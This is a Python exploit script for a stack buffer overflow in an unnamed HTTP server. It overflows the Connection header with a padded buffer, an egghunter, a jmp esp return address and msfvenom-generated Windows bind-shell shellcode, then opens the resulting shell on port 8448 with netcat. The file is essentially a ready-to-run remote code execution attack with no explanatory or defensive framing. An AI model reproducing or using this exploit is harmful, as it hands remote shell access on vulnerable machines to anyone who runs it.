import socket
import sys
import struct
import time
from subprocess import call

# how to execute:
# python overflow.py 192.168.1.109 80

ip = sys.argv[1]
port = int(sys.argv[2])

# jmp esp / call esp
eip = 0x6FC66D71
eip = struct.pack("<I", eip)  # convert address to little endian format

# need to use egghunter because the stack has a limit and the payload must be placed at the beginning of the exploit
egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
             "\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
             "w00t"  # The 4 byte tag of egghunter!
             "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

# msfvenom -p windows/shell_bind_tcp LPORT=8448 -f c -a x86 --platform windows -b "\x00\x09\x0a" -e x86/shikata_ga_nai
payload = ("\xdb\xd6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x53\xbb\xa8\x91\x1f"
           "\xc1\x31\x5a\x17\x83\xea\xfc\x03\xf2\x82\xfd\x34\xfe\x4d\x83"
           "\xb7\xfe\x8d\xe4\x3e\x1b\xbc\x24\x24\x68\xef\x94\x2e\x3c\x1c"
           "\x5e\x62\xd4\x97\x12\xab\xdb\x10\x98\x8d\xd2\xa1\xb1\xee\x75"
           "\x22\xc8\x22\x55\x1b\x03\x37\x94\x5c\x7e\xba\xc4\x35\xf4\x69"
           "\xf8\x32\x40\xb2\x73\x08\x44\xb2\x60\xd9\x67\x93\x37\x51\x3e"
           "\x33\xb6\xb6\x4a\x7a\xa0\xdb\x77\x34\x5b\x2f\x03\xc7\x8d\x61"
           "\xec\x64\xf0\x4d\x1f\x74\x35\x69\xc0\x03\x4f\x89\x7d\x14\x94"
           "\xf3\x59\x91\x0e\x53\x29\x01\xea\x65\xfe\xd4\x79\x69\x4b\x92"
           "\x25\x6e\x4a\x77\x5e\x8a\xc7\x76\xb0\x1a\x93\x5c\x14\x46\x47"
           "\xfc\x0d\x22\x26\x01\x4d\x8d\x97\xa7\x06\x20\xc3\xd5\x45\x2d"
           "\x20\xd4\x75\xad\x2e\x6f\x06\x9f\xf1\xdb\x80\x93\x7a\xc2\x57"
           "\xd3\x50\xb2\xc7\x2a\x5b\xc3\xce\xe8\x0f\x93\x78\xd8\x2f\x78"
           "\x78\xe5\xe5\x15\x70\x40\x56\x08\x7d\x32\x06\x8c\x2d\xdb\x4c"
           "\x03\x12\xfb\x6e\xc9\x3b\x94\x92\xf2\x62\x65\x1a\x14\x0e\x75"
           "\x4a\x8e\xa6\xb7\xa9\x07\x51\xc7\x9b\x3f\xf5\x80\xcd\xf8\xfa"
           "\x10\xd8\xae\x6c\x9b\x0f\x6b\x8d\x9c\x05\xdb\xda\x0b\xd3\x8a"
           "\xa9\xaa\xe4\x86\x59\x4e\x76\x4d\x99\x19\x6b\xda\xce\x4e\x5d"
           "\x13\x9a\x62\xc4\x8d\xb8\x7e\x90\xf6\x78\xa5\x61\xf8\x81\x28"
           "\xdd\xde\x91\xf4\xde\x5a\xc5\xa8\x88\x34\xb3\x0e\x63\xf7\x6d"
           "\xd9\xd8\x51\xf9\x9c\x12\x62\x7f\xa1\x7e\x14\x9f\x10\xd7\x61"
           "\xa0\x9d\xbf\x65\xd9\xc3\x5f\x89\x30\x40\x6f\xc0\x18\xe1\xf8"
           "\x8d\xc9\xb3\x64\x2e\x24\xf7\x90\xad\xcc\x88\x66\xad\xa5\x8d"
           "\x23\x69\x56\xfc\x3c\x1c\x58\x53\x3c\x35")

junk = (2048 - len(payload) - len("w00tw00t")) * "A"

exploit = junk + "w00tw00t" + payload + eip + ("\x90" * 20) + egghunter


# sending exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("Sending exploit to host... ")
buff = ("GET / HTTP/1.1\r\n")
s.send(buff)
buff = ("Host: " + ip + "\r\n")
s.send(buff)
buff = ("Connection: " + exploit + "\r\n\n")
s.send(buff)
time.sleep(5)
s.close()

# connecting host
print("Starting connect on port 8448")
time.sleep(10)
netcat = "nc " + ip + " 8448"
call(netcat, shell=True)
